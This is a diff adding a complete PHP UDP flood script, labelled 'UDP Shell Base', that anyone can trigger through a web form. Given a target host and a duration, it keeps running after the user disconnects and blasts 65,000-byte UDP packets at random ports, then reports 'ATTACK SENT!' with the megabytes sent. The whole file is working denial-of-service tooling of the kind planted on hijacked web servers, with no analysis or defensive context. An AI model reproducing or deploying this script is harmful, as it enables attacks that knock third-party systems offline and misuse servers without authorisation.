@@ -1,0 +1,54 @@
+<?php
+            // UDP Shell Base - ObscureCoder
+            // HTML Design - MiKe
+            error_reporting(0);
+     
+            if(isset($_GET['host']) && isset($_GET['time'])){
+                    $packets = 0;
+                    ignore_user_abort(true);
+     
+                    $exec_time = intval($_GET['time']);
+     
+                    $time = time();
+                    $max_time = $time + $exec_time;
+                    $host = $_GET['host'];
+     
+                    for($i = 0; $i < 65000;$i++){
+                            $out .= 'X';
+                    }
+     
+                    while(1){
+                            $packets++;
+     
+                            if(time() > $max_time){
+                                    break;
+                            }
+     
+                            $rand = rand(1, 65000);
+                            $fp = fsockopen('udp://'.$host, $rand, $errno, $errstr, 5);
+                            if($fp){
+                                    fwrite($fp, $out);
+                                    fclose($fp);
+                            }
+     
+                    }
+     
+                    echo 'ATTACK SENT! You sent '.round(($packets * 65)/ 1024, 2).'MB(s)';
+                    echo '<form action="?" method="GET">
+            <input type="hidden" name="act" value="phptools" /><br />
+            <input type="text" name="host" placeholder="Host" /><br />
+            <input type="text" name="time" placeholder="Time" /><br />
+            <input type="submit" value="Start Attack" />
+    </form>';
+     
+     
+            } else {
+                    echo '<form action="?" method="GET">
+            <input type="hidden" name="act" value="phptools" /><br />
+            <input type="text" name="host" placeholder="Host" /><br />
+            <input type="text" name="time" placeholder="Time" /><br />
+            <input type="submit" value="Start Attack" />
+    </form>';
+            }
+     
+    ?>
